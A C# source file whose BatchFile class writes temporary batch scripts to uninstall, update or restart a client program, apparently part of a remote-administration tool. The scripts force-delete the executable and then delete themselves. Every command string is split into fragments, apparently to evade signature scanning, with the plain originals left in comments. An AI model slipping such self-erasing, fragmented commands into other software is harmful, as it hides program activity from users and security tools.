using Rouzzf.Common.Helpers;
using System.IO;
using System.Text;

namespace Rouzzf.Client.IO
{
    /// <summary>
    /// Provides methods to create batch files for application update, uninstall and restart operations.
    /// </summary>
    public static class BatchFile
    {
        /// <summary>
        /// Creates the uninstall batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
        public static string CreateUninstallBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");

            StringBuilder sb = new StringBuilder();
            sb.Append("@echo").Append(" off").Append("\r\n");
            sb.Append("chcp").Append(" 65001").Append("\r\n");
            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");

            /*string uninstallBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";*/

            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// Creates the update batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <param name="newFilePath">The new file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns an empty string on failure.</returns>
        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");


            StringBuilder sb = new StringBuilder();
            sb.Append("@echo").Append(" off").Append("\r\n");
            sb.Append("chcp").Append(" 65001").Append("\r\n");
            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
            sb.Append("move").Append(" /y").Append(" \"").Append(newFilePath).Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
            sb.Append("start").Append(" \"").Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");

            /*string updateBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";*/

            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));
            return batchFile;
        }

        /// <summary>
        /// Creates the restart batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
        public static string CreateRestartBatch(string currentFilePath)
        {
            string batchFile = FileHelper.GetTempFilePath(".bat");


            StringBuilder sb = new StringBuilder();
            sb.Append("@echo").Append(" off").Append("\r\n");
            sb.Append("chcp").Append(" 65001").Append("\r\n");
            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
            sb.Append("start").Append(" \"").Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");
            
            /*string restartBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "ping -n 10 localhost > nul" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";*/

            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));

            return batchFile;
        }
    }
}
